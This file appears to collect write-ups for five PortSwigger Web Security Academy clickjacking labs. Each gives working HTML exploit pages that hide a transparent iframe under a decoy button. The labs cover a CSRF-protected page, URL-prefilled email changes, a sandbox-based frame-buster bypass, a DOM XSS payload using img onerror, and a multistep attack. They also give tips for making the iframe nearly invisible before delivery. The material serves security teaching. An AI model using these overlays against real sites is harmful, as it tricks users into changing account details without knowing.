# 🕶️ Basic Clickjacking with CSRF Token Protection

## 🧠 Overview

This lab demonstrates a **Basic Clickjacking attack** on a page that is protected with a **CSRF token**, but still vulnerable to UI redressing.

The goal is to trick the user into performing an unintended action by overlaying a transparent iframe.

---

## 🎯 Objective

Exploit the vulnerable page by:

- Embedding the target page inside an iframe  
- Aligning a fake UI element over a real button  
- Tricking the user into clicking the real action unintentionally  

---

## 💡 Key Idea

Even if CSRF tokens exist, clickjacking can still work because:

- The victim’s browser already has a valid session  
- The action is triggered by real user interaction  
- CSRF protection does NOT stop UI manipulation attacks  
---
## ⚙️ Exploit Code
## ⚙️ Exploit Code

```html
<!DOCTYPE html>
<html>
<head>
<style>
    iframe {
        position: relative;
        width: 1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 300px;
        left: 80px;
        z-index: 1;
        font-size: 22px;
        font-weight: bold;
        cursor: pointer;
    }
</style>
</head>

<body>

<div>👉 Click here to win!</div>

<iframe 
    src="https://YOUR-LAB-ID.web-security-academy.net/my-account">
</iframe>

</body>
</html>
```

---

## ⚙️ Setup Steps

Replace:

* `YOUR-LAB-ID` with your actual PortSwigger lab ID

Open the page in browser

Adjust alignment:

* `top`
* `left`
* `width`
* `height`

Reduce iframe visibility:

* `opacity: 0.05` (for stealth)

---

## 🧬 How It Works

* Victim is logged into target site
* Attacker embeds the target page inside iframe
* Fake UI element is placed on top
* User clicks overlay → real button is clicked inside iframe
* CSRF token is already valid → request succeeds
  
---
# 🕶️ Clickjacking with Form Input Data Prefilled from a URL Parameter

## 🧠 Overview

This lab demonstrates a **Clickjacking attack** where form input values are automatically populated through URL parameters.

The attack leverages prefilled data and UI redressing techniques to trick a victim into submitting unintended actions.

---

## 🎯 Objective

Exploit the vulnerable page by:

* Embedding the target page inside an iframe
* Using URL parameters to prefill form data
* Positioning a fake element over the real target action
* Tricking the user into clicking it

---

## 💡 Key Idea

Some applications automatically populate form fields using URL parameters.

This creates a scenario where:

* The attacker controls the input value
* The victim sees a fake interface
* The real action happens invisibly inside the iframe

---

## ⚙️ Exploit Code

```html
<!DOCTYPE html>
<html>
<head>
<style>
    iframe {
        position: relative;
        width: 1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 300px;
        left: 80px;
        z-index: 1;
        font-size: 22px;
        font-weight: bold;
        cursor: pointer;
    }
</style>
</head>

<body>

<div>👉 Click here to win!</div>

<iframe
src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com">
</iframe>

</body>
</html>
```

---

## ⚙️ Setup Steps

Replace:

* `YOUR-LAB-ID` with your actual PortSwigger lab ID

Open the page in the browser.

Adjust positioning values:

* `top`
* `left`
* `width`
* `height`

Adjust visibility:

* `opacity: 0.05` for stealth mode

---

## 🧬 How It Works

* The attacker embeds the target page in an iframe
* The email field is automatically populated from the URL parameter
* A visible fake element is placed above the target action
* The victim clicks the visible element
* The click lands on the hidden target interface
* The unintended action is performed using the prefilled value

---

# 🕶️ Clickjacking with a Frame Buster Script

## 🧠 Overview

This lab demonstrates a **Clickjacking attack** against an application protected by a **frame buster script**.

The objective is to bypass the protection and trick a victim into clicking a hidden action that updates their email address.

---

## 🎯 Objective

Exploit the vulnerable page by:

* Bypassing the frame-busting mechanism
* Embedding the target page inside an iframe
* Aligning a fake button with the hidden action
* Triggering an email update action through clickjacking

---

## 💡 Key Idea

Some applications use JavaScript frame busters to prevent clickjacking:

```javascript
if (top !== self) {
    top.location = self.location;
}
```

This lab bypasses the protection using:

```html
sandbox="allow-forms"
```

The sandbox attribute prevents the frame-buster behavior from functioning as intended while still allowing form submission.

---

## ⚙️ Exploit Code

```html
<!DOCTYPE html>
<html>
<head>

<style>
iframe {
    position: relative;
    width: 500px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
}

div {
    position: absolute;
    top: 385px;
    left: 80px;
    z-index: 1;
    font-size: 22px;
    font-weight: bold;
    cursor: pointer;
}

</style>

</head>

<body>

<div>👉 Click me</div>

<iframe
sandbox="allow-forms"
src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com">
</iframe>

</body>
</html>
```

---

## ⚙️ Setup Steps

1. Log in using:

```text
Username: wiener
Password: peter
```

2. Open the exploit server.

3. Replace:

```text
YOUR-LAB-ID
```

with your unique PortSwigger lab ID.

4. Adjust iframe properties:

* Width: `500px`
* Height: `700px`

5. Position the fake button:

* Top: `385px`
* Left: `80px`

6. Set transparency:

* Use `0.1` during alignment
* Change to `0.0001` before delivery

7. Replace:

```text
Test me
```

with:

```text
Click me
```

8. Change the email value to a new address that does not already exist.

---

## 🧬 How It Works

* The target page attempts to block iframe embedding
* The iframe uses sandbox restrictions
* The frame buster becomes ineffective
* The attacker places a fake clickable element over the real button
* The victim clicks the visible content
* The hidden email update action executes inside the iframe

---
# 🕶️ Exploiting Clickjacking Vulnerability to Trigger DOM-Based XSS

## 🧠 Overview

This lab demonstrates how a **Clickjacking vulnerability** can be combined with a **DOM-based XSS issue** inside a controlled training environment.

The objective is to exploit user interface manipulation together with client-side processing behavior.

---

## 🎯 Objective

Exploit the vulnerable page by:

* Embedding the target page inside an iframe
* Supplying crafted input through URL parameters
* Positioning a fake UI element above the target action
* Triggering the vulnerable client-side behavior

---

## 💡 Key Idea

This scenario combines two concepts:

* **Clickjacking** → manipulating what the user clicks
* **DOM-based XSS** → client-side JavaScript processes untrusted input

The interaction between these vulnerabilities can cause unexpected behavior within the application.

---

## ⚙️ Exploit Code

```html
<!DOCTYPE html>
<html>
<head>
<style>
    iframe {
        position: relative;
        width: 1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 300px;
        left: 80px;
        z-index: 1;
        font-size: 22px;
        font-weight: bold;
        cursor: pointer;
    }
</style>
</head>

<body>

<div>👉 Test me</div>

<iframe
src="https://YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult">
</iframe>

</body>
</html>
```

---

## ⚙️ Setup Steps

Replace:

* `YOUR-LAB-ID` with your actual PortSwigger lab ID

Open the page in a browser.

Adjust alignment values:

* `top`
* `left`
* `width`
* `height`

Adjust visibility:

* `opacity: 0.05` for stealth mode

---

## 🧬 How It Works

* The target page is embedded inside an iframe
* User-controlled values are passed through URL parameters
* A visible element is positioned above the embedded page
* User interaction is redirected to the hidden target interface
* Client-side processing handles the supplied input

---
# 🕶️ Multistep Clickjacking Attack

## 🧠 Overview

This lab demonstrates a **multi-step Clickjacking attack** where the victim is tricked into performing multiple clicks in sequence.

The attack uses multiple overlay elements positioned above a hidden iframe to guide the user through several unintended actions.

---

## 🎯 Objective

Exploit the vulnerable page by:

* Embedding the target page inside an iframe
* Positioning multiple fake UI elements
* Aligning each fake button with the target actions
* Tricking the victim into completing multiple clicks

---

## 💡 Key Idea

Some actions require more than a single click.

This attack works by:

* Overlaying multiple visible elements
* Repositioning click targets
* Guiding the victim through a sequence of actions

---

## ⚙️ Exploit Code

```html
<!DOCTYPE html>
<html>
<head>

<style>

iframe {
    position: relative;
    width: 1000px;
    height: 700px;
    opacity: 0.1;
    z-index: 2;
}

.firstClick,
.secondClick {
    position: absolute;
    top: 300px;
    left: 80px;
    z-index: 1;
    font-size: 22px;
    font-weight: bold;
    cursor: pointer;
}

.secondClick {
    top: 420px;
    left: 100px;
}

</style>

</head>

<body>

<div class="firstClick">
👉 Test me first
</div>

<div class="secondClick">
👉 Test me next
</div>

<iframe
src="https://YOUR-LAB-ID.web-security-academy.net/my-account">
</iframe>

</body>
</html>
```

---

## ⚙️ Setup Steps

Replace:

* `YOUR-LAB-ID` with your PortSwigger lab ID

Adjust iframe properties:

* `width`
* `height`
* `opacity`

Adjust positioning values:

First click element:

* `top`
* `left`

Second click element:

* `top`
* `left`

Set:

* `opacity: 0.1` during testing
* `opacity: 0.0001` for final delivery

---

## 🧬 How It Works

* The attacker embeds the target page inside an iframe
* Multiple visible elements are placed above hidden actions
* Each fake button aligns with a real target action
* The victim follows the displayed instructions
* Clicks are redirected to the hidden interface
* Multiple unintended actions are completed

---

## ⚠️ Disclaimer

This project is intended strictly for educational purposes and testing within controlled environments such as PortSwigger Web Security Academy labs.
